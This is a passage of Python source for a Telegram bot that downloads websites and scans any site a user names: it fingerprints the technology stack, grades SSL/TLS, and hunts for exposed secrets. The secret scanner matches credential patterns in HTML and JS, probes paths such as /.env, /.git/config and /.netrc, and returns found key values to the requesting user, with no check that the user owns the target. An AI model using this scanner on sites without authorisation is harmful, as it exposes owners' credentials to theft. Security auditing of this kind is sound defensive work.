                    chat_id=chat_id,
                    document=zf,
                    filename=os.path.basename(zip_path),
                    caption=(
                        f"✅ *Website Downloaded*\n"
                        f"🔗 `{sanitize_log_url(url)}`\n"
                        f"📄 Pages: `{page_count}` | 📦 Assets: `{downloaded}`\n"
                        f"💾 Size: `{zip_mb:.1f} MB`"
                    ),
                    parse_mode="Markdown"
                )
        else:
            with open(zip_path, "rb") as zf:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=zf,
                    filename=os.path.basename(zip_path),
                    caption=(
                        f"✅ *Website Downloaded*\n"
                        f"🔗 `{sanitize_log_url(url)}`\n"
                        f"📄 Pages: `{page_count}` | 📦 Assets: `{downloaded}`\n"
                        f"💾 Size: `{zip_mb:.1f} MB`"
                    ),
                    parse_mode="Markdown"
                )

        os.remove(zip_path)
        shutil.rmtree(domain_dir, ignore_errors=True)

        # Update DB
        async with db_lock:
            loop = asyncio.get_running_loop()
            db2  = await loop.run_in_executor(None, _load_db_sync)
            u2   = get_user(db2, uid, uname)
            reset_daily(u2)
            u2["count_today"]     = u2.get("count_today", 0) + 1
            u2["total_downloads"] = u2.get("total_downloads", 0) + 1
            hist = u2.get("downloads", [])
            hist.append({
                "url": sanitize_log_url(url)[:60],
                "time": datetime.now().strftime("%m-%d %H:%M"),
                "size_mb": f"{zip_mb:.1f}",
                "status": "success",
            })
            u2["downloads"] = hist[-100:]
            await loop.run_in_executor(None, _save_user_sync, str(uid), u2)

        await safe_edit(
            msg,
            f"✅ *Download Complete!*\n"
            f"📄 Pages: `{page_count}` | 📦 Assets: `{downloaded}`\n"
            f"💾 `{zip_mb:.1f} MB`",
            parse_mode="Markdown"
        )

    except Exception as e:
        logger.error("Download finalize error: %s", e)
        await safe_edit(
            msg, f"❌ *Download Error:*\n`{type(e).__name__}: {str(e)[:100]}`",
            parse_mode="Markdown"
        )

# ═══════════════════════════════════════════════════════════
# 🌐  /dl  —  Download Command
# ═══════════════════════════════════════════════════════════
async def dl_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data  = q.data          # dl_single|URL | dl_full|URL | dl_jssingle|URL ...
    parts = data.split("|", 1)
    if len(parts) != 2:
        return
    mode, url = parts
    full_site = "full" in mode
    use_js    = "js"   in mode
    await q.edit_message_text(
        f"⏳ *Download request received*\n"
        f"🔗 `{sanitize_log_url(url)}`\n"
        f"📋 {'Full' if full_site else 'Single'} | {'JS Render' if use_js else 'Normal'}",
        parse_mode="Markdown"
    )
    await enqueue_download(update, context, url, full_site, use_js)

async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(
            "📥 *Download Usage:*\n`/dl <url>`\n\n"
            "Mode ကို ကီးဘုတ်မှ ရွေးပါ ↓",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📄 Single Page",  callback_data=f"dl_single|{url}"),
            InlineKeyboardButton("🌐 Full Site",    callback_data=f"dl_full|{url}"),
        ],
        [
            InlineKeyboardButton("⚡ Single+JS",   callback_data=f"dl_jssingle|{url}"),
            InlineKeyboardButton("⚡ Full+JS",     callback_data=f"dl_jsfull|{url}"),
        ],
    ])
    await update.effective_message.reply_text(
        f"🔗 `{sanitize_log_url(url)}`\n\n📋 *Download Mode ရွေးပါ:*",
        reply_markup=kb,
        parse_mode="Markdown"
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in _cancel_flags:
        _cancel_flags[uid].set()
    if uid in _scan_tasks:
        _scan_tasks[uid].cancel()
    scan = _active_scans.pop(uid, None)
    await update.effective_message.reply_text(
        f"🛑 *{'`'+scan+'` ရပ်သွားပြီ' if scan else 'ရပ်ပြီ'}*",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 🔬  TECHSTACK SCANNER  —  Fully Async
# ═══════════════════════════════════════════════════════════
_TECH_SIGS: dict = {
    # CMS
    "WordPress":   [r"wp-content", r"wp-includes", r"WordPress"],
    "Drupal":      [r"Drupal\.settings", r"/sites/default/files"],
    "Joomla":      [r"/components/com_", r"Joomla!"],
    "Shopify":     [r"cdn\.shopify\.com", r"Shopify\.theme"],
    "Magento":     [r"Mage\.Cookies", r"/pub/static/"],
    "Ghost CMS":   [r"ghost\.org", r"/ghost/api/"],
    "Wix":         [r"wixsite\.com", r"X-Wix-Published-Version"],
    "Squarespace": [r"squarespace\.com", r"Static\.SQUARESPACE_CONTEXT"],
    # JS Frameworks
    "React":       [r"__REACT_DEVTOOLS", r"react\.development\.js", r'data-reactroot'],
    "Vue.js":      [r"__vue__", r"vue\.min\.js", r"vue\.runtime"],
    "Angular":     [r"ng-version=", r"angular\.min\.js", r"ng-app="],
    "Next.js":     [r"__NEXT_DATA__", r"/_next/static/"],
    "Nuxt.js":     [r"__NUXT__", r"/_nuxt/"],
    "Svelte":      [r"__svelte", r"svelte-"],
    "jQuery":      [r"jquery\.min\.js", r"jquery-\d"],
    # Backends
    "Laravel":     [r"laravel_session", r"X-Powered-By: PHP", r"/vendor/"],
    "Django":      [r"csrfmiddlewaretoken", r"django", r"__admin_media_prefix__"],
    "Ruby on Rails":[r"X-Runtime", r"_rails_assets_"],
    "Express.js":  [r"X-Powered-By: Express"],
    "Spring":      [r"JSESSIONID", r"Spring Framework"],
    "FastAPI":     [r'"detail"', r'/openapi\.json', r'FastAPI'],
    "Flask":       [r"Werkzeug", r"flask"],
    "ASP.NET":     [r"__VIEWSTATE", r"X-AspNet-Version", r"ASP\.NET"],
    # Web Servers
    "Nginx":       [r"Server: nginx"],
    "Apache":      [r"Server: Apache"],
    "IIS":         [r"Server: Microsoft-IIS", r"X-Powered-By: ASP\.NET"],
    "LiteSpeed":   [r"Server: LiteSpeed", r"X-LiteSpeed"],
    # CDN / WAF
    "Cloudflare":  [r"CF-RAY", r"cloudflare", r"__cfduid"],
    "AWS CloudFront":[r"X-Amz-Cf-Id", r"CloudFront"],
    "Akamai":      [r"X-Akamai", r"akamaized\.net"],
    "Fastly":      [r"X-Served-By.*cache", r"fastly\.com"],
    "Imperva":     [r"X-Iinfo", r"visid_incap_"],
    "Sucuri":      [r"X-Sucuri", r"sucuri"],
    # Analytics
    "Google Analytics":[r"gtag\(", r"ga\('create'", r"google-analytics"],
    "Google Tag Manager":[r"googletagmanager\.com", r"GTM-"],
    "Facebook Pixel":[r"fbevents\.js", r"facebook\.net/en_US/fbevents"],
    "Hotjar":      [r"hotjar\.com", r"hjid"],
    # Cloud
    "AWS S3":      [r"s3\.amazonaws\.com", r"AmazonS3"],
    "Firebase":    [r"firebaseapp\.com", r"firebase\.google\.com"],
    "Vercel":      [r"vercel\.app", r"x-vercel-"],
    "Netlify":     [r"netlify\.app", r"x-nf-"],
    "Heroku":      [r"herokuapp\.com", r"x-heroku"],
    # Databases (exposed)
    "MySQL":       [r"MySQL", r"mysql_connect"],
    "PostgreSQL":  [r"PostgreSQL", r"psycopg"],
    "MongoDB":     [r"MongoDB", r"mongoDB"],
    "Redis":       [r"Redis", r"redis://"],
    "Elasticsearch":[r"elastic", r"kibana"],
    # Payment
    "Stripe":      [r"stripe\.com/v3", r"Stripe\.setPublishableKey"],
    "PayPal":      [r"paypal\.com/sdk", r"paypalobjects\.com"],
}

async def _async_techstack(url: str) -> dict:
    """Fully async tech fingerprint scan."""
    res = {
        "detected": {}, "server": "", "headers": {},
        "cookies": [], "cms_version": "", "php_version": "",
        "response_time_ms": 0, "status_code": 0,
        "waf_detected": "", "cloud_provider": "",
    }
    t0   = time.time()
    resp = await async_fetch(url, timeout=15)
    if not resp:
        res["error"] = "Failed to connect"
        return res
    res["response_time_ms"] = int((time.time() - t0) * 1000)
    res["status_code"]      = resp["status"]
    headers_raw = resp["headers"]
    body        = resp["text"][:60000]
    combined    = (str(headers_raw) + body).lower()

    # Collect security headers
    for h in ("Server","X-Powered-By","X-Generator","Via","X-Cache","CF-Ray",
              "Strict-Transport-Security","Content-Security-Policy",
              "X-Frame-Options","X-XSS-Protection","X-Content-Type-Options",
              "Referrer-Policy","Permissions-Policy"):
        val = headers_raw.get(h, "")
        if val:
            res["headers"][h] = val

    res["server"] = headers_raw.get("Server", "Unknown")

    # Version extraction
    php_m = re.search(r"PHP/([0-9]+\.[0-9]+\.[0-9]+)",
                      headers_raw.get("X-Powered-By", ""))
    if php_m:
        res["php_version"] = php_m.group(1)
    wp_m = re.search(r'<meta[^>]+content=["\']WordPress ([0-9.]+)', body)
    if wp_m:
        res["cms_version"] = f"WordPress {wp_m.group(1)}"

    # Signature matching
    CAT_MAP = {
        "WordPress":"CMS","Drupal":"CMS","Joomla":"CMS","Shopify":"CMS",
        "Magento":"CMS","Ghost CMS":"CMS","Wix":"CMS","Squarespace":"CMS",
        "React":"JS Framework","Vue.js":"JS Framework","Angular":"JS Framework",
        "Next.js":"JS Framework","Nuxt.js":"JS Framework","Svelte":"JS Framework",
        "jQuery":"JS Library","Laravel":"Backend","Django":"Backend",
        "Ruby on Rails":"Backend","Express.js":"Backend","Spring":"Backend",
        "FastAPI":"Backend","Flask":"Backend","ASP.NET":"Backend",
        "Nginx":"Web Server","Apache":"Web Server","IIS":"Web Server",
        "LiteSpeed":"Web Server","Cloudflare":"CDN/WAF","AWS CloudFront":"CDN/WAF",
        "Akamai":"CDN/WAF","Fastly":"CDN/WAF","Imperva":"CDN/WAF","Sucuri":"CDN/WAF",
        "Google Analytics":"Analytics","Google Tag Manager":"Analytics",
        "Facebook Pixel":"Analytics","Hotjar":"Analytics",
        "AWS S3":"Cloud","Firebase":"Cloud","Vercel":"Cloud",
        "Netlify":"Cloud","Heroku":"Cloud",
        "MySQL":"Database","PostgreSQL":"Database","MongoDB":"Database",
        "Redis":"Database","Elasticsearch":"Database",
        "Stripe":"Payment","PayPal":"Payment",
    }
    for tech, patterns in _TECH_SIGS.items():
        for pat in patterns:
            if re.search(pat, combined, re.I):
                cat = CAT_MAP.get(tech, "Other")
                res["detected"].setdefault(cat, [])
                if tech not in res["detected"][cat]:
                    res["detected"][cat].append(tech)
                break
    # WAF/Cloud summary
    wafs = res["detected"].get("CDN/WAF", [])
    if wafs:
        res["waf_detected"] = ", ".join(wafs)
    for cloud in ("Cloudflare","Vercel","Netlify","Heroku","AWS S3","Firebase"):
        if cloud in str(res["detected"]):
            res["cloud_provider"] = cloud
            break
    return res

async def cmd_techstack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            f"🔬 *TechStack Scanner*\n`/techstack https://example.com`\n\n"
            f"*Detects:* CMS, JS Framework, Backend, CDN/WAF,\n"
            f"Analytics, Cloud, Database, Payment systems\n"
            f"*Signatures:* `{len(_TECH_SIGS)}` total",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running — `/stop` နှိပ်ပါ", parse_mode="Markdown")
        return
    _active_scans[uid] = "TechStack"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔬 *TechStack — `{domain}`*\n\n⏳ Scanning signatures...", parse_mode="Markdown"
    )
    try:
        data = await _async_techstack(url)
    except Exception as e:
        await safe_edit(msg, f"❌ Error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    lines = [f"🔬 *TechStack — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
    sc_icon = "✅" if data["status_code"] == 200 else "⚠️"
    lines.append(f"{sc_icon} Status: `{data['status_code']}` | ⏱ `{data['response_time_ms']}ms`")
    lines.append(f"🖥 Server: `{data['server']}`")
    if data["php_version"]:
        lines.append(f"⚙️ PHP: `{data['php_version']}`")
    if data["cms_version"]:
        lines.append(f"🌐 CMS: `{data['cms_version']}`")
    if data["waf_detected"]:
        lines.append(f"🛡 WAF/CDN: `{data['waf_detected']}`")
    if data["cloud_provider"]:
        lines.append(f"☁️ Cloud: `{data['cloud_provider']}`")

    CAT_ICONS = {
        "CMS":"📦","JS Framework":"⚛️","Backend":"⚙️","Web Server":"🖥",
        "CDN/WAF":"🛡","Analytics":"📊","Cloud":"☁️","Database":"🗄",
        "Payment":"💳","JS Library":"📚","Other":"🔧",
    }
    if data["detected"]:
        lines.append("")
        for cat, techs in data["detected"].items():
            icon = CAT_ICONS.get(cat, "🔷")
            lines.append(f"*{icon} {cat}:* {' • '.join(f'`{t}`' for t in techs)}")

    # Security headers
    sec_headers = {k: v for k, v in data["headers"].items()
                   if k in ("Content-Security-Policy","Strict-Transport-Security",
                             "X-Frame-Options","X-XSS-Protection",
                             "X-Content-Type-Options","Referrer-Policy")}
    missing = [h for h in ("Content-Security-Policy","Strict-Transport-Security",
                            "X-Frame-Options","X-Content-Type-Options")
               if h not in sec_headers]
    if sec_headers or missing:
        lines.append("\n🔒 *Security Headers:*")
        for h, v in sec_headers.items():
            lines.append(f"  ✅ `{h}`: `{v[:40]}`")
        for h in missing:
            lines.append(f"  ❌ `{h}` — Missing")

    if data.get("error"):
        lines.append(f"\n⚠️ `{data['error']}`")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔒  SSL/TLS SCANNER  —  Async
# ═══════════════════════════════════════════════════════════
async def _async_ssltls(hostname: str) -> dict:
    import ssl as _ssl, datetime as _dt
    res = {
        "cert_valid": False, "cert_expired": False, "days_left": None,
        "subject": {}, "issuer": {}, "san": [],
        "tls_versions": {}, "weak_ciphers": [], "strong_ciphers": [],
        "hsts": False, "hsts_max_age": 0, "hsts_preload": False,
        "cert_grade": "F", "issues": [], "warnings": [],
    }

    def _cert_sync():
        try:
            ctx = _ssl.create_default_context()
            with ctx.wrap_socket(socket.create_connection((hostname, 443), timeout=10),
                                 server_hostname=hostname) as s:
                cert = s.getpeercert()
                res["cert_valid"] = True
                res["subject"]    = dict(x[0] for x in cert.get("subject", []))
                res["issuer"]     = dict(x[0] for x in cert.get("issuer",  []))
                exp = cert.get("notAfter", "")
                if exp:
                    exp_dt    = _dt.datetime.strptime(exp, "%b %d %H:%M:%S %Y %Z")
                    days_left = (exp_dt - _dt.datetime.utcnow()).days
                    res["days_left"]    = days_left
                    res["cert_expired"] = days_left < 0
                    if days_left < 0:
                        res["issues"].append(f"❌ EXPIRED {abs(days_left)} days ago")
                    elif days_left < 14:
                        res["issues"].append(f"⚠️ Expires in {days_left} days (CRITICAL)")
                    elif days_left < 30:
                        res["warnings"].append(f"⚠️ Expires in {days_left} days")
                res["san"] = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"][:10]
                # Active cipher
                c = s.cipher()
                if c:
                    cn, tv, bits = c
                    res["strong_ciphers"].append(f"{cn} ({bits}-bit, {tv})")
                    if bits and bits < 128:
                        res["weak_ciphers"].append(cn)
                        res["issues"].append(f"⚠️ Weak cipher: {cn} ({bits}-bit)")
        except _ssl.SSLCertVerificationError as e:
            res["issues"].append(f"❌ Cert verify failed: {e}")
        except Exception as e:
            res["issues"].append(f"❌ SSL connect failed: {e}")

    def _tls_sync():
        for ver, ver_const, attr in [
            ("TLSv1.2", _ssl.TLSVersion.TLSv1_2, "TLSv1_2"),
            ("TLSv1.3", _ssl.TLSVersion.TLSv1_3, "TLSv1_3") if hasattr(_ssl.TLSVersion, "TLSv1_3") else None,
            ("TLSv1.0", _ssl.TLSVersion.TLSv1,   "TLSv1")   if hasattr(_ssl.TLSVersion, "TLSv1") else None,
        ]:
            if ver is None:
                continue
            try:
                ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
                ctx.maximum_version = ver_const
                ctx.minimum_version = ver_const
                ctx.check_hostname  = False
                ctx.verify_mode     = _ssl.CERT_NONE
                with ctx.wrap_socket(socket.create_connection((hostname, 443), timeout=5),
                                     server_hostname=hostname):
                    label = "⚠️ Supported (WEAK)" if ver == "TLSv1.0" else "✅ Supported"
                    res["tls_versions"][ver] = label
                    if ver == "TLSv1.0":
                        res["issues"].append("⚠️ TLS 1.0 enabled — disable recommended")
            except Exception:
                res["tls_versions"][ver] = "✅ Disabled" if ver == "TLSv1.0" else "❌ Not supported"

    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, _cert_sync)
    await loop.run_in_executor(None, _tls_sync)

    # HSTS via async
    r = await async_fetch(f"https://{hostname}", timeout=8)
    if r:
        hsts = r["headers"].get("Strict-Transport-Security", "")
        if hsts:
            res["hsts"] = True
            m = re.search(r"max-age=(\d+)", hsts)
            if m:
                res["hsts_max_age"] = int(m.group(1))
            res["hsts_preload"] = "preload" in hsts.lower()
            if res["hsts_max_age"] < 15768000:
                res["warnings"].append("⚠️ HSTS max-age < 6 months")
        else:
            res["issues"].append("❌ HSTS header missing")

    # Grade
    score = 100
    if res["cert_expired"]:      score -= 50
    if not res["hsts"]:          score -= 15
    if res["weak_ciphers"]:      score -= 20
    if "WEAK" in str(res["tls_versions"]):
        score -= 15
    if res["days_left"] and res["days_left"] < 14: score -= 20
    elif res["days_left"] and res["days_left"] < 30: score -= 10
    res["cert_grade"] = (
        "A+" if score >= 95 else "A" if score >= 90 else
        "B"  if score >= 80 else "C" if score >= 70 else
        "D"  if score >= 60 else "F"
    )
    return res

async def cmd_ssltls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔒 *SSL/TLS Scanner*\n`/ssltls example.com`\n\n"
            "Checks: Cert validity, expiry, TLS versions,\n"
            "cipher strength, HSTS, overall grade (A+ → F)",
            parse_mode="Markdown"
        )
        return
    host = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0]
    safe_ok, reason = is_safe_url(f"https://{host}")
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running — `/stop` နှိပ်ပါ", parse_mode="Markdown")
        return
    _active_scans[uid] = "SSL/TLS Scan"
    msg = await update.effective_message.reply_text(
        f"🔒 *SSL/TLS — `{host}`*\n\n⏳ Connecting...", parse_mode="Markdown"
    )
    try:
        data = await _async_ssltls(host)
    except Exception as e:
        await safe_edit(msg, f"❌ SSL scan error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    grade      = data["cert_grade"]
    grade_icon = {"A+":"🟢","A":"🟢","B":"🟡","C":"🟡","D":"🔴","F":"🔴"}.get(grade,"⚪")
    lines      = [
        f"🔒 *SSL/TLS — `{host}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Grade: {grade_icon} *{grade}*\n",
    ]
    if data["subject"]:
        lines.append(f"📜 *Certificate:*")
        lines.append(f"  CN: `{data['subject'].get('commonName', host)}`")
        lines.append(f"  Issuer: `{data['issuer'].get('organizationName','Unknown')}`")
    if data["days_left"] is not None:
        ei = "✅" if data["days_left"] > 30 else ("⚠️" if data["days_left"] > 0 else "❌")
        lines.append(f"  Expiry: {ei} `{data['days_left']} days left`")
    if data["san"]:
        lines.append(f"  SAN: `{'`, `'.join(data['san'][:4])}`")
    if data["tls_versions"]:
        lines.append(f"\n⚙️ *TLS Versions:*")
        for ver, status in data["tls_versions"].items():
            lines.append(f"  {ver}: {status}")
    if data["strong_ciphers"]:
        lines.append(f"\n🔐 *Active Cipher:*")
        for c in data["strong_ciphers"][:2]:
            lines.append(f"  `{c}`")
    hsts_icon = "✅" if data["hsts"] else "❌"
    lines.append(f"\n🛡 *HSTS:* {hsts_icon}")
    if data["hsts"]:
        lines.append(f"  max-age: `{data['hsts_max_age']//86400} days` | preload: {'✅' if data['hsts_preload'] else '❌'}")
    if data["issues"] or data["warnings"]:
        lines.append(f"\n*⚠️ Issues:*")
        for i in data["issues"]:
            lines.append(f"  {i}")
        for w in data["warnings"]:
            lines.append(f"  {w}")
    else:
        lines.append("\n✅ No SSL/TLS issues detected")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🔑  SECRET SCANNER  —  Fully Async
# ═══════════════════════════════════════════════════════════
_SECRET_PATTERNS = {
    "AWS Access Key":      (r"AKIA[0-9A-Z]{16}", "🔴 CRITICAL"),
    "GCP API Key":         (r"AIza[0-9A-Za-z\-_]{35}", "🔴 CRITICAL"),
    "GitHub Token":        (r"ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}", "🔴 CRITICAL"),
    "GitLab Token":        (r"glpat-[A-Za-z0-9\-]{20}", "🔴 CRITICAL"),
    "Slack Token":         (r"xox[baprs]-[0-9A-Za-z\-]{10,48}", "🔴 CRITICAL"),
    "Slack Webhook":       (r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+", "🔴 CRITICAL"),
    "Discord Token":       (r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", "🟠 HIGH"),
    "Discord Webhook":     (r"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+", "🟠 HIGH"),
    "Telegram Bot Token":  (r"\d{8,10}:[A-Za-z0-9_\-]{35}", "🔴 CRITICAL"),
    "Stripe Secret Key":   (r"sk_live_[0-9a-zA-Z]{24,}", "🔴 CRITICAL"),
    "Stripe Publishable":  (r"pk_live_[0-9a-zA-Z]{24,}", "🟡 MEDIUM"),
    "Google OAuth":        (r"ya29\.[0-9A-Za-z\-_]+", "🔴 CRITICAL"),
    "Firebase Key":        (r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}", "🔴 CRITICAL"),
    "Twilio Auth Token":   (r"SK[0-9a-fA-F]{32}", "🔴 CRITICAL"),
    "SendGrid Key":        (r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}", "🔴 CRITICAL"),
    "Mailgun Key":         (r"key-[0-9a-zA-Z]{32}", "🟠 HIGH"),
    "NPM Token":           (r"npm_[A-Za-z0-9]{36}", "🟠 HIGH"),
    "JWT Token":           (r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*", "🟡 MEDIUM"),
    "RSA Private Key":     (r"-----BEGIN RSA PRIVATE KEY-----", "🔴 CRITICAL"),
    "PEM Private Key":     (r"-----BEGIN PRIVATE KEY-----", "🔴 CRITICAL"),
    "MongoDB URI":         (r"mongodb(\+srv)?://[^\"\'<>\s]+", "🔴 CRITICAL"),
    "MySQL URI":           (r"mysql://[^\"\'<>\s]{10,}", "🔴 CRITICAL"),
    "PostgreSQL URI":      (r"postgres(ql)?://[^\"\'<>\s]{10,}", "🔴 CRITICAL"),
    "Generic API Key":     (r"(?i)(api[_\-]?key|apikey)[\"\s:=]+[\"\']([A-Za-z0-9\-_]{20,})", "🟠 HIGH"),
    "Generic Secret":      (r"(?i)(secret[_\-]?key|client[_\-]?secret)[\"\s:=]+[\"\']([A-Za-z0-9\-_]{16,})", "🟠 HIGH"),
    "Bearer Token":        (r"[Bb]earer [A-Za-z0-9\-_=.+/]{20,}", "🟠 HIGH"),
}

def _scan_secrets_text(text: str, source: str, seen: set) -> list:
    found = []
    for stype, (pat, sev) in _SECRET_PATTERNS.items():
        try:
            for m in re.findall(pat, text):
                val = m if isinstance(m, str) else (m[1] if len(m) > 1 else m[0])
                val = val.strip().strip("\"'")
                if len(val) < 8:
                    continue
                key = f"{stype}:{val[:20]}"
                if key not in seen:
                    seen.add(key)
                    found.append({
                        "type": stype, "severity": sev,
                        "value": val[:60] + ("..." if len(val) > 60 else ""),
                        "source": source,
                    })
        except re.error:
            pass
    return found

async def _async_secretscan(url: str, progress_cb=None) -> dict:
    """Fully async secret scanner — JS files + HTML + env paths."""
    res  = {"secrets": [], "js_files": [], "pages_scanned": 0, "total_found": 0}
    seen = set()

    def progress(msg: str):
        if progress_cb:
            progress_cb(msg)

    # Step 1: Main page
    progress("🔍 Main page HTML scanning...")
    main = await async_fetch(url, timeout=12)
    if not main:
        res["error"] = "Failed to fetch"
        return res
    res["pages_scanned"] += 1
    res["secrets"].extend(_scan_secrets_text(main["text"], "HTML", seen))

    # Step 2: JS files
    try:
        soup = BeautifulSoup(main["text"], _BS)
        js_urls = []
        for tag in soup.find_all("script", src=True):
            js_url = urljoin(url, tag["src"])
            if urlparse(js_url).hostname == urlparse(url).hostname:
                js_urls.append(js_url)
        # Inline scripts
        for tag in soup.find_all("script"):
            if not tag.get("src") and tag.string:
                res["secrets"].extend(
                    _scan_secrets_text(tag.string, "inline-script", seen)
                )
        res["js_files"] = js_urls[:25]
    except Exception:
        pass

    progress(f"🔍 {len(res['js_files'])} JS files scanning...")

    # Step 3: Parallel JS fetch
    if res["js_files"]:
        js_results = await async_fetch_many(res["js_files"], timeout=10, concurrency=10)
        for js_url, jr in zip(res["js_files"], js_results):
            if jr and jr["text"]:
                fname = js_url.split("/")[-1][:40]
                res["secrets"].extend(_scan_secrets_text(jr["text"], fname, seen))

    # Step 4: Sensitive paths — parallel
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    SENSITIVE = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/config.js", "/config.json", "/app.config.js", "/settings.json",
        "/assets/config.json", "/static/config.js", "/api/config",
        "/.git/config", "/wp-config.php.bak", "/database.yml",
        "/secrets.json", "/.npmrc", "/.netrc",
    ]
    progress("🔍 Sensitive paths checking...")
    path_results = await async_fetch_many(
        [base + p for p in SENSITIVE], timeout=8, concurrency=8
    )
    for path, pr in zip(SENSITIVE, path_results):
        if pr and pr["status"] == 200 and len(pr["text"]) > 10:
            extras = _scan_secrets_text(pr["text"], path, seen)
            if extras:
                res["secrets"].extend(extras)
                progress(f"🔴 Sensitive file found: `{path}`")

    res["total_found"] = len(res["secrets"])
    return res

async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔑 *Secret Scanner*\n`/secretscan https://example.com`\n\n"
            "Detects: AWS keys, GitHub tokens, Stripe, Firebase,\n"
            "Telegram tokens, DB URIs, JWT, Private keys\n⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "Secret Scan"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔑 *Secret Scanner — `{domain}`*\n\n⏳ Scanning JS files + source...",
        parse_mode="Markdown"
    )
    progress_msgs = []

    async def _prog():
        while True:
            await asyncio.sleep(2.5)
            if progress_msgs:
                txt = progress_msgs[-1]
                progress_msgs.clear()
                try:
                    await safe_edit(msg,
                        f"🔑 *Secret Scanner — `{domain}`*\n\n{txt}", parse_mode="Markdown")
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        async with scan_semaphore:
            data = await _async_secretscan(url, lambda t: progress_msgs.append(t))
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total  = data["total_found"]
    crits  = [s for s in data["secrets"] if "CRITICAL" in s["severity"]]
    highs  = [s for s in data["secrets"] if "HIGH"     in s["severity"]]
    meds   = [s for s in data["secrets"] if "MEDIUM"   in s["severity"]]
    sev_label = (
        "🔴 CRITICAL" if crits else "🟠 HIGH" if highs else
        "🟡 MEDIUM"   if meds  else "✅ Clean"
    )
    lines = [
        f"🔑 *Secret Scanner — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {sev_label}",
        f"JS files: `{len(data['js_files'])}` | Secrets: `{total}`",
    ]
    for group_label, group in [("🔴 CRITICAL", crits), ("🟠 HIGH", highs), ("🟡 MEDIUM", meds)]:
        if not group:
            continue
        lines.append(f"\n*{group_label} ({len(group)}):*")
        for s in group[:6]:
            lines.append(f"  `{s['type']}`")
            lines.append(f"  Value: `{s['value']}`")
            lines.append(f"  Source: `{s['source']}`")
    if not data["secrets"]:
        lines.append("\n✅ No secrets detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

    # JSON report
    rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=io.BytesIO(rj.encode()),
